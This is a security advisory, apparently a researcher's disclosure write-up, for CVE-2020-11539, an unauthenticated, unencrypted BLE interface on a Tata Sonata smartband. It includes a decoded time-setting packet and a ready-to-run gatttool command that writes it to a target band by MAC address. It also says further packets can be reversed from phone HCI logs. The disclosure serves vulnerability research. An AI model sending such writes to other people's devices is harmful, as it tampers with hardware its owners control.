# CVE-2020-11539: Improper Access Control in Tata Sonata Smartband

## Information
**Description:**  It has been identified that the smart band has no pairing (mode 0 BLE security level) The data being transmitted over the air is not encrypted. Adding to this, the data being sent to the smart band doesn't have any authentication or signature verification makes any attacker to control the parameter of the smart device. 
   
**Versions Affected:** Smart SF Rush - 1.12

**Researcher:** Sayli Ambure (https://twitter.com/sayli_ambure)  

**MITRE CVE link:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11539

## Proof-of-Concept Exploit
### Description

The following packet is reversed and found to be for changing the time, more packets can be reversed by extracting hcisnoop dump from your phone. 

1. **Data value:** 00870e00141401060712052b051e

   |**Data Hexdump:** | 00 | 87 | 0e | 00 | 14 | 14 | 01 | 06 | 07 | 12 | 05 | 2b | 05 | 1e |
   |------------------|----|----|----|----|----|----|----|----|----|----|----|----|----|----|
   | **Data Decimal:**| 00 |135 | 14 | 00 | 20 | 20 | 01 | 06 | 07 | 18 | 05 | 43 | 05 | 30 | 
  
  *  **00 87:** Header of the packet
   
  *  **0e 00:** Type of the pacekt
   
  *  **14 14:** Year in hex (2020)
   
  *  **01 06:** Month and Day ( Jan 6th)
   
  *  **07 12:** Hour and Minute in hex ( 07:18AM)
   
  *  **05 :** Seconds
   
2. Send following Gatttool command for controlling the time of the smartband:

`gatttool -t random -b <mac-address> --char-write-req -a 0xe -n 00870e00141401060712052b051e`
 

### Proof of Concept Video:

<a href="http://www.youtube.com/watch?feature=player_embedded&v=VDl2FOAivOk
" target="_blank"><img src="http://img.youtube.com/vi/VDl2FOAivOk/0.jpg" 
 width="240" height="180" border="10" /></a>
